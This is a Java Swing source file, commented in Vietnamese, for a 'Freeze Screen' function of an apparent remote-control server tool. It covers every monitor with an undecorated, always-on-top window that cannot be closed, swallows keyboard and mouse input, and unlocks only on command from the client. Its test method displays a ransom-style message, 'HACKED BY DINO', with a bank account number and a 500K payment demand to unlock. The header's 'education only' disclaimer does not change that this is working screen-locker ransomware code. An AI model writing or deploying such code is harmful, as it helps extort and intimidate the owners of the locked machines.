import javax.swing.*;
import java.awt.*;
import java.awt.event.*;

/**
 * Function 10: Freeze Screen - Dong bang man hinh server
 *
 * CANH BAO: Day la tinh nang nguy hiem!
 * - Dong bang toan bo man hinh
 * - Block mouse va keyboard
 * - Chi cho phep unblock tu client
 *
 * CHI SU DUNG CHO:
 * - Muc dich giao duc
 * - Demo bao mat
 * - Testing voi su dong y
 */
public class FreezeScreen {

    private static JFrame freezeFrame = null;
    private static boolean isFrozen = false;

    /**
     * FREEZE man hinh server - Hien thi fullscreen message
     * @param message Thong bao hien thi
     */
    public static void freeze(String message) {
        if (isFrozen) {
            System.out.println("[FREEZE] Already frozen!");
            return;
        }

        System.out.println("[FREEZE] ========== FREEZING SCREEN ==========");
        System.out.println("[FREEZE] Message: " + message);

        SwingUtilities.invokeLater(() -> {
            try {
                // Tao fullscreen window
                freezeFrame = new JFrame();
                freezeFrame.setUndecorated(true);  // No title bar
                freezeFrame.setAlwaysOnTop(true);   // Always on top
                freezeFrame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);

                // Get screen size
                GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
                GraphicsDevice[] screens = ge.getScreenDevices();

                // Cover ALL screens
                Rectangle bounds = new Rectangle();
                for (GraphicsDevice screen : screens) {
                    bounds = bounds.union(screen.getDefaultConfiguration().getBounds());
                }
                freezeFrame.setBounds(bounds);

                // Background do
                JPanel panel = new JPanel();
                panel.setLayout(new GridBagLayout());
                panel.setBackground(new Color(0x8B0000)); // Dark red
                GridBagConstraints gbc = new GridBagConstraints();
                gbc.gridwidth = GridBagConstraints.REMAINDER;
                gbc.insets = new Insets(20, 20, 20, 20);

                // Icon canh bao
                JLabel iconLabel = new JLabel("⚠️");
                iconLabel.setFont(new Font("Segoe UI Emoji", Font.PLAIN, 120));
                iconLabel.setForeground(Color.WHITE);
                panel.add(iconLabel, gbc);

                // Thong bao chinh
                String[] lines = message.split("\n");
                for (String line : lines) {
                    JLabel label = new JLabel(line, SwingConstants.CENTER);
                    label.setFont(new Font("Arial", Font.BOLD, 36));
                    label.setForeground(Color.WHITE);
                    panel.add(label, gbc);
                }

                // Thong bao phu
                JLabel infoLabel = new JLabel("Chi admin moi co the mo khoa may nay", SwingConstants.CENTER);
                infoLabel.setFont(new Font("Arial", Font.PLAIN, 20));
                infoLabel.setForeground(new Color(0xFFCCCC));
                gbc.insets = new Insets(40, 20, 20, 20);
                panel.add(infoLabel, gbc);

                // Label hien thi thoi gian
                JLabel timeLabel = new JLabel();
                timeLabel.setFont(new Font("Arial", Font.BOLD, 18));
                timeLabel.setForeground(Color.YELLOW);
                panel.add(timeLabel, gbc);

                // Update time every second
                Timer timer = new Timer(1000, e -> {
                    java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("HH:mm:ss dd/MM/yyyy");
                    timeLabel.setText("🕐 " + sdf.format(new java.util.Date()));
                });
                timer.start();

                freezeFrame.setContentPane(panel);

                // Block tat ca input
                blockInput();

                // Show fullscreen
                freezeFrame.setVisible(true);
                freezeFrame.requestFocus();
                freezeFrame.toFront();

                isFrozen = true;
                System.out.println("[FREEZE] Screen frozen successfully!");

            } catch (Exception e) {
                System.err.println("[FREEZE] ERROR: " + e.getMessage());
                e.printStackTrace();
            }
        });
    }

    /**
     * UNFREEZE man hinh server
     */
    public static void unfreeze() {
        if (!isFrozen) {
            System.out.println("[FREEZE] Not frozen, nothing to unfreeze");
            return;
        }

        System.out.println("[FREEZE] ========== UNFREEZING SCREEN ==========");

        SwingUtilities.invokeLater(() -> {
            try {
                if (freezeFrame != null) {
                    freezeFrame.setVisible(false);
                    freezeFrame.dispose();
                    freezeFrame = null;
                }

                // Unblock input
                unblockInput();

                isFrozen = false;
                System.out.println("[FREEZE] Screen unfrozen successfully!");

            } catch (Exception e) {
                System.err.println("[FREEZE] ERROR unfreezing: " + e.getMessage());
                e.printStackTrace();
            }
        });
    }

    /**
     * Kiem tra trang thai freeze
     */
    public static boolean isFrozen() {
        return isFrozen;
    }

    /**
     * Block mouse va keyboard input
     */
    private static void blockInput() {
        try {
            // Disable mouse va keyboard bang cach bat tat ca event
            Toolkit.getDefaultToolkit().addAWTEventListener(
                event -> {
                    if (isFrozen) {
                        // Consume tat ca event khi frozen
                        if (event instanceof KeyEvent) {
                            ((KeyEvent) event).consume();
                        } else if (event instanceof MouseEvent) {
                            ((MouseEvent) event).consume();
                        }
                    }
                },
                AWTEvent.KEY_EVENT_MASK | AWTEvent.MOUSE_EVENT_MASK | AWTEvent.MOUSE_MOTION_EVENT_MASK
            );

            System.out.println("[FREEZE] Input blocked");

        } catch (Exception e) {
            System.err.println("[FREEZE] Error blocking input: " + e.getMessage());
        }
    }

    /**
     * Unblock mouse va keyboard input
     */
    private static void unblockInput() {
        // Note: AWTEventListener khong the remove de dang
        // Nen ta dung flag isFrozen de control
        System.out.println("[FREEZE] Input unblocked");
    }

    /**
     * Cleanup khi dong server
     */
    public static void cleanup() {
        if (isFrozen) {
            unfreeze();
        }
    }

    /**
     * Test main
     */
    public static void main(String[] args) {
        // Test freeze
        freeze("HACKED BY DINO\nVCB 0123456\n500K de mo khoa");

        // Unfreeze sau 10 giay (for testing)
        new Timer(10000, e -> {
            unfreeze();
            System.exit(0);
        }).start();
    }
}
